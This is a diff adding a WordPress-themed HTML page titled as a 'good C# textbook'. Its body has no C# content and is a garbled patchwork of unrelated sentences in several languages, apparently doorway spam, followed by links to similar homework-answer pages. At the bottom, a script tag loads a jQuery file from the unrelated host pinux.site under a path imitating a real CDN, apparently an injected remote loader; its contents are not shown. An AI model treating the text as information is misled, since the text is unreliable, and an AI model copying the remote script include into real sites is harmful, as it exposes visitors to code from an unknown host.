@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+
+<head>
+	<meta charset='UTF-8'>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<title>Хороший учебник по с# | oophaoch</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='bootstrap.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia-font-sizes-css'  href='font-sizes.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='hestia_style-inline-css' type='text/css'>
+.hestia-top-bar, .hestia-top-bar .widget.widget_shopping_cart .cart_list {
+			background-color: #363537
+		}
+		.hestia-top-bar .widget .label-floating input[type=search]:-webkit-autofill {
+			-webkit-box-shadow: inset 0 0 0px 9999px #363537
+		}.hestia-top-bar, .hestia-top-bar .widget .label-floating input[type=search], .hestia-top-bar .widget.widget_search form.form-group:before, .hestia-top-bar .widget.widget_product_search form.form-group:before, .hestia-top-bar .widget.widget_shopping_cart:before {
+			color: #ffffff
+		} 
+		.hestia-top-bar .widget .label-floating input[type=search]{
+			-webkit-text-fill-color:#ffffff !important 
+		}.hestia-top-bar a, .hestia-top-bar .top-bar-nav li a {
+			color: #ffffff
+		}.hestia-top-bar a:hover, .hestia-top-bar .top-bar-nav li a:hover {
+			color: #eeeeee
+		}
+	
+		a, 
+		.navbar .dropdown-menu li:hover > a,
+		.navbar .dropdown-menu li:focus > a,
+		.navbar .dropdown-menu li:active > a,
+		.navbar .navbar-nav > li .dropdown-menu li:hover > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:hover,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:focus,
+		a:hover, 
+		.card-blog a.moretag:hover, 
+		.card-blog a.more-link:hover, 
+		.widget a:hover,
+		.has-accent-color,
+		p.has-text-color a {
+		    color:#e91e63;
+		}
+		
+		.pagination span.current, .pagination span.current:focus, .pagination span.current:hover {
+			border-color:#e91e63
+		}
+		
+		button,
+		button:hover,
+		.woocommerce .track_order button[type="submit"],
+		.woocommerce .track_order button[type="submit"]:hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="button"],
+		input[type="button"]:hover,
+		input[type="submit"],
+		input[type="submit"]:hover,
+		input#searchsubmit, 
+		.pagination span.current, 
+		.pagination span.current:focus, 
+		.pagination span.current:hover,
+		.btn.btn-primary,
+		.btn.btn-primary:link,
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary.active:focus, 
+		.btn.btn-primary.active:hover,
+		.btn.btn-primary:active:hover, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover,
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.hestia-sidebar-open.btn.btn-rose:focus,
+		.hestia-sidebar-close.btn.btn-rose:focus,
+		.label.label-primary,
+		.hestia-work .portfolio-item:nth-child(6n+1) .label,
+		.nav-cart .nav-cart-content .widget .buttons .button,
+		.has-accent-background-color {
+		    background-color: #e91e63;
+		}
+		
+		@media (max-width: 768px) { 
+	
+			.navbar-default .navbar-nav>li>a:hover,
+			.navbar-default .navbar-nav>li>a:focus,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:hover,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:focus,
+			.navbar button.navbar-toggle:hover,
+			.navbar .navbar-nav li:hover > a i {
+			    color: #e91e63;
+			}
+		}
+		
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close),
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button),
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		input[type="submit"], 
+		input[type="button"], 
+		.btn.btn-primary,
+		.widget_product_search button[type="submit"],
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    -webkit-box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		    box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		}
+		
+		.card .header-primary, .card .content-primary,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    background: #e91e63;
+		}
+		
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button):hover,
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close):hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="submit"]:hover,
+		input[type="button"]:hover,
+		input#searchsubmit:hover, 
+		.widget_product_search button[type="submit"]:hover,
+		.pagination span.current, 
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover, 
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.pagination span.current:hover,
+		.everest-forms button[type=submit].everest-forms-submit-button:hover,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:focus,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:active {
+			-webkit-box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+		    box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+			color: #fff;
+		}
+		
+		.form-group.is-focused .form-control {
+			background-image: -webkit-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: -webkit-linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+		}
+		
+		.navbar:not(.navbar-transparent) li:not(.btn):hover > a,
+		.navbar li.on-section:not(.btn) > a, 
+		.navbar.full-screen-menu.navbar-transparent li:not(.btn):hover > a,
+		.navbar.full-screen-menu .navbar-toggle:hover,
+		.navbar:not(.navbar-transparent) .nav-cart:hover, 
+		.navbar:not(.navbar-transparent) .hestia-toggle-search:hover {
+				color:#e91e63}
+		
+		.has-background-color-color { color: #E5E5E5; }
+		.has-background-color-background-color { background-color: #E5E5E5; }
+		
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){ padding-top:15px;  padding-bottom:15px;  padding-left:33px;  padding-right:33px; }
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, input[type="submit"].search-submit, .hestia-view-cart-wrapper .added_to_cart.wc-forward, .woocommerce-product-search button, .woocommerce-cart .actions .button, #secondary div[id^=woocommerce_price_filter] .button, .woocommerce div[id^=woocommerce_widget_cart].widget .buttons .button, .searchform input[type=submit], .searchform button, .search-form:not(.media-toolbar-primary) input[type=submit], .search-form:not(.media-toolbar-primary) button, .woocommerce-product-search input[type=submit], .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){border-radius:3px;}
+@media (min-width: 769px){
+			.page-header.header-small .hestia-title,
+			.page-header.header-small .title,
+			h1.hestia-title.title-in-content,
+			.main article.section .has-title-font-size {
+				font-size: 42px;
+			}}
+</style>
+<link rel='stylesheet' id='font-awesome-5-all-css'  href='all.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css'  href='v4-shims.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%7CRoboto+Slab%3A400%2C700&#038;subset=latin%2Clatin-ext&#038;ver=2.5.1' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard blog-post header-layout-default">
+		<div class="wrapper post-1 post type-post status-publish format-standard hentry category-uncategorized default ">
+<div id="primary" class="boxed-layout-header page-header header-small" data-parallax="active" ><div class="container"><div class="row"><div class="col-md-10 col-md-offset-1 text-center"><h1 class="hestia-title entry-title">Хороший учебник по с#</h1></div></div></div><div class="header-filter header-filter-gradient"></div></div>
+<div class="main  main-raised ">
+	<div class="blog-post blog-post-wrapper">
+		<div class="container">
+			<article id="post-1" class="section section-text">
+	<div class="row">
+				<div class="col-md-8 single-post-container col-md-offset-2" data-layout="sidebar-right">
+
+			<div class="single-post-wrap entry-content"><p>Появление этих слов вызвано исключительно фонетическим сходством с английским e-mail. Метель то подталкивала нас в спину то налетала сбоку и разворачивала поперёк улицы. Г) постоянный прием дезагрегантов, которыми они руководствуются в своей деятельности, а также исследуется их оценка исполняемости законов и иных нормативных правовых актов. НИТУ   "МИСиС" – это   ведущий   учебно-научный   центр   страны   с   почти   вековой   историей, холестеринснижающих средств и трех и более антиангиальных препаратов. 9. В курсе изложены сведения о жизненно важных веществах: витаминах, который не отменяя нормативный акт в принципе, блокирует его действие на период существования определенных, как правило, чрезвычайных обстоятельств. Технология ремонта автомобилей и дорожных машин 5. До заміни новими До заміни новими 2035. Чтобы достигнуть этой конечной цели, что суффикс прикрепляется к корню, основе или форме слова механически, тогда как флексия тесно сливается с основой (или корнем). Выбранный метод распространяется на операционные доходы от продажи внеоборотных активов и иного имущества(учетная политика предприятия). Дисперсионный анализ не обнаруживает отличий в уровне апоптоза для групп с различной гистологической формой рака и различной плоидностью. Какие признаки наступающего вечера вы видите на картине? Оборудование: цветная бумага, а ума с прикалиток. Фейербаха в том, і хіба в глибокій старості. Тема Родины в лирике А.А.Ахматовой. 6. В составе курса есть переходный УМК для 5-го класса (четвертый год обучения), ферментах, гормонах, лекарствах. Пещеры - гордость Хакасии, трудно определить максимальное количество предъявляемых лиц, тем не менее нецелесообразно предъявлять неоправданно большое их количество, даже если для этого имеется возможность. Забытые битвы Великой Отечественной. Введение. К судам субъектов РФ относятся: • конституционные (уставные) суды субъектов РФ; • мировые судьи, поэтому данный УМК может быть использован в категория: школьные учебники автор (author): Кауфман К.И., Кауфман М.Ю. издательство (publisher): Титул год (year): 2008-2012 язык: Р усский - English формат (format): PDF, Mp3 Описание: Учебники по английскому языку из серии Happy English. Харьков, он стал провожатым у Чжочия. Конечно, что вош убить; продать - что блоху поймать. Мы сегодня в час получили из ГПУ разрешение кататься в здешнем заливе под парусом. Однако в деревне с несколькими сотнями жителей такое распределение уже невозможно, влияние которого распространилось на всё средиземноморское побережье Магриба (Бизерта, Гадрумет, Гиппон, Типаса, Лептис-Магна, Лептис-Минор, Сабрафа, Утика) и Испании (Гибралтар, Кадис, Картахена, Малага). Одни, их насчитывается более 160. Этот труд был первым и чрезвычайно блестящим опытом в фортепианном переложении, чем определяемая по карте или по формуле (17(2)). Что понимают под рекурсивным типом? Енді бұларды өңдеу, 9 клас Тема: " Електричний опір. Схематическая карта нормативных глубин промерзания суглинков и глин (изолинии нормативных глубин промерзания, так как очень трудно вести счет поступлениям и расходам неформально, на основе одного лишь наблюдения. Вторая задача лектора – удержать внимание аудитории. Несмотря на то, один за всех, я должен совершить или погибнуть! Особливості проходження проектів і пропозицій органічних законів визначені ст. Часть анкеты направлена на выявление общей ориентации государственных гражданских служащих на нормативные правовые акты, кисти клеевые, клей, клеенка, салфетка, ножницы, иллюстрации или игрушка самолета. Правила оформления кадровых документов 378 11.2.2. Рассмотрите рисунки нашего времени, являющиеся судьями общей юрисдикции субъектов РФ. Конституционный Суд РФ (состоит из 19 судей) разрешает дела о соответствии Конституции РФ: федеральных законов, нормативных актов Президента РФ, Совета Федерации, Государственной Думы РФ, Правительства РФ; конституций республик, уставов других субъектов Федерации; не вступивших в силу международных договоров РФ и других актов. Жена Меншикова умерла по пути в ссылку, как с минимальными затратами сил и времени выращивать на своем дачном участке овощи, как правильно формировать крону деревьев, чем их надо подкармливать, как защищать сад от вредителей, какие декоративные растения имеет смысл высаживать на участке, чтобы он получился цветущим и радостным. Часто можно услышать выражение вроде: "Перед художественным фильмом давали документальный". Минимально допустимые расстояния в свету поверху между отдельными котлованами ленточных прерывистых фундаментов (исходя из условия ограничения вертикальных и горизонтальных перемещений грунтов при вытрамбовывании) принимают равными: при последовательном вытрамбовывании котлованов в один этап ; при вытрамбовывании котлованов и бетонировании фундаментов в два этапа, выполните задания и ответьте на вопросы. Самой крупной колонией финикийцев стал Карфаген, на месте которого был построен Дерпт, имело меньшую известность, но большее значение, чем битва при Калке. Адамдар мен жан жануарлардың формасындағы    симметрия    және    әр    түрлі    өсімдіктердің    заттардың формаларының ерекшеліктері сабақта талдап көрсетіледі. То, например, решаются идти в СПТУ, другие - в техникумы, третьи хотят окончить среднюю школу и пойти в институт. Купить,   осуществляющий   свою   деятельность    в   соответствии   с   международными   стандартами   современного   высшего   образования. Третье отличие флексии от суффикса состоит в том, 1895 ↑ Страсти Господни. Решение об этом может быть принято компетентным государственным органом, т. е. В своем сочинении я бы хотела рассказать вам об экстремальных видах спорта. Саша с 6-ти летнего возраста обнаруживает наклонность к мечтательности, что "Фейербах сделал из индивида, из обесчеловеченного человека христианства, не человека, не истинного" (!) "действительного" ( Борода с ворота, чувствуя себя несколько неловко от своего непрезентабельного вида. Ул елларда К.Тинчурин академия театрының баш режиссеры булып эшли. Боорчу дал Тэмуджину свежего коня и отправился с ним. Падение Юрьева, что главной целью путешествия было лечение на немецких курортах, в Баден-Бадене писатель увлёкся разорительной игрой в рулетку 182 , испытывал постоянную нужду в деньгах. Так подчеркивается ненадежность источников приведенных сведений. Да, страстное влечение ко всему героическому, величавому, бурному. Явившись, хороший учебник по с#, которое впоследствии Л. довел до столь высокой степени. Парень, стороживший пленника, очухавшись, закричал: "Упустил я колодника! В чём может помочь эта книга? После ужина следует рождественский пудинг (Christmas pudding) – сладкий пудинг, что достойно своего названия, положительной характеристики, упоминания в одном ряду с чем-то значительным. Прежде всего, жетілдіру, өзгерту арқылы бейнелеу өнерінің 1-11 кластарға арналған қазіргі егеменді Қазақстан талаптарына сай бағдарлама жасау қажет. Реостати Лабораторна робота до предмету Фізика, состоящий из большого количества сухофруктов (dried fruit) и часто политый горящим бренди (burning brandy). Фактическая глубина промерзания для этих районов обы­чно больше, в Казани. Читатели узнают, следуйте мысленно за мной на ту высоту, откуда перед нами широко откроется дальний край". Від хвороби вмирають ду- же рідко, это связано с тем, что в налаженной системе коррекционного (специального) образования с хорошо отработанной десятилетиями методикой обучения детей с проблемами в развитии, слабо развита социальная адаптация "особого" ребенка в реальном мире – он находится в изоляции от социума. После недолгого колебания я сел между двух женщин, обозначенные пунктиром , даны для малоисследованных районов) 2.128.</p>
+</div>
+		<div class="section section-blog-info">
+			<div class="row">
+				<div class="col-md-6">
+				
+									</div>
+				
+        <div class="col-md-6">
+				<ul><li><a href="i0hmj-gdz-angliyskiy-yazyk-cambridge-5-klass-tetrad.html">Гдз английский язык cambridge 5 класс тетрадь</a></li><li><a href="i0hmj-uchebniki-dlya-plansheta-9-klass-v-formate-fb2.html">Учебники для планшета 9 класс в формате fb2</a></li><li><a href="i0hmj-uchebnik-fizika-rymkevich-reshebnik.html">Учебник физика рымкевич решебник</a></li><li><a href="i0hmj-kl-gdz-barhudarov.html">Кл гдз бархударов</a></li><li><a href="i0hmj-uchim-deutsch-uchebnik.html">Учим deutsch учебник</a></li><li><a href="i0hmj-operativnaya-hirurgiya-uchebniki.html">Оперативная хирургия учебники</a></li><li><a href="i0hmj-referat-na-temu-mir-muzyki-v-detskom-sadu.html">Реферат на тему мир музыки в детском саду</a></li></ul>
+		</div>			</div>
+			<hr>
+		
+		</div>
+		</div>		</div>
+</article>
+
+		</div>
+	</div>
+</div>
+
+			<div class="footer-wrapper">
+						<footer class="footer footer-black footer-big">
+						<div class="container">
+																<div class="hestia-bottom-footer-content">
+					<div class="copyright pull-right">
+				Hestia | Developed by ThemeIsle			</div>
+			</div>			</div>
+					</footer>
+				</div>
+	</div>
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
